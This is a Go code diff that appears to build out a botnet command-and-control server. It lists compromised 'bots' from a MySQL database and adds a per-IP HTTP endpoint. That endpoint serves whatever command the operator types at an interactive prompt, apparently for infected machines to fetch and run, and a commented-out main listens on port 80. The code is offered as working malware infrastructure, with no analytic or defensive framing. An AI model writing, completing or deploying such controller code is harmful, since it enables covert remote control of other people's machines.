@@ -6,6 +6,10 @@ import (
 	_ "github.com/go-sql-driver/mysql"
 	"github.com/olekukonko/tablewriter"
 	"os"
+	"net/http"
+	"bufio"
+	"strings"
+	_ "time"
 )
 
 type bot struct { 
@@ -13,6 +17,8 @@ type bot struct {
 	os string
 	host string
 }
+
+var command string = ""
 
 func ListBots() { 
 	var db *sql.DB
@@ -52,30 +58,35 @@ func ListBots() {
 
 }
 
-func InteractHandler(w http.ResponseWriter, r *http.Request) { 
-
-}
+func InteractHandler(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, command) }
 
 func Interact(ip string) { 
 	reader := bufio.NewReader(os.Stdin)
-	colorRed := "\033[31m"
+	//colorRed := "\033[31m"
 	colorGreen := "\033[32m"
 	url := "/" + ip
+
+	fmt.Println(string(colorGreen), "interacting with: ", ip, "...")
 	http.HandleFunc(url, InteractHandler)
 	for{
-		fmr.Println(string(colorGreen), "interacting with: ", ip, "...")
-		fmt.Println("\n")
+		
 		fmt.Print(string(colorGreen), "[~]-> ")
 		text, _ := reader.ReadString('\n')
 		text = strings.Replace(text, "\n", "", -1)
-		if strings.Compare("list", text) == 0 {
-			fmt.Println("listing puppets...")
-		}else if strings.Compare("control", text) == 0 {
-			fmt.Println("fetching...")
-		}
+		command = text
+		
+		
 	}
+	
 }
 
+/*
 func main() {
-	ListBots()
+	
+	fmt.Printf("Waiting for connections...\n")
+	go http.ListenAndServe(":80", nil)
+	Interact("192.168.1.1")
+	
+	
 }
+*/
